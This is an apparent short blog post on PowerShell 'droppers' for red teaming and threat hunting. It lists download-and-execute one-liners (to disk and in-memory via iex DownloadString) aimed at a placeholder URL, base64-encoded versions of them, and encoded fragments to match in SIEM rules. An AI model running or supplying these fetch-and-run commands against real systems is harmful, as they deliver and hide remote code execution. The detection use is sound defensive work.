---
layout: post
title:  "Powershell for Red Teaming"
date:   2025-06-16 21:00:00 +1000
categories: scripts
---

## Red teaming powershell scripts. Droppers and more.

Things to look out for when threat hunting and creating SIEM rules. Also helpful for red teaming/malware development

---

### Droppers
--- Unencoded Droppers ---
- ``` powershell -Command "Invoke-WebRequest -Uri 'https://google.com/safe-script.ps1' -OutFile $env:TEMP\Word.ps1; & $env:TEMP\Word.ps1" ``` (Downloads to disk)
- ``` powershell -Command "iex(New-Object Net.WebClient).DownloadString('https://google.com/safe-script.ps1')" ``` (Downloads to memory)

--- Encoded Droppers ---
- ```powershell -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAgAC0AQwBvAG0AbQBhAG4AZAAgACIASQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACcAaAB0AHQAcABzADoALwAvAGcAbwBvAGcAbABlAC4AYwBvAG0ALwBzAGEAZgBlAC0AcwBjAHIAaQBwAHQALgBwAHMAMQAnACAALQBPAHUAdABGAGkAbABlACAAJABlAG4AdgA6AFQARQBNAFAAXABXAG8AcgBkAC4AcABzADEAOwAgACYAIAAkAGUAbgB2ADoAVABFAE0AUABcAFcAbwByAGQALgBwAHMAMQAiAA==```
- ```powershell -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAgAC0AQwBvAG0AbQBhAG4AZAAgACIAaQBlAHgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4ARABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwAHMAOgAvAC8AZwBvAG8AZwBsAGUALgBjAG8AbQAvAHMAYQBmAGUALQBzAGMAcgBpAHAAdAAuAHAAcwAxACcAKQAiAA==```

Patterns to look out for when threat hunting as potentially malicious base64 encoded commands
- SQBuAHYAbwBrAGUALQBX (Invoke-WebRequest)
- aQBlAHgAIAAoAE4AZQB3 (iex (New-Object Net.WebClient))

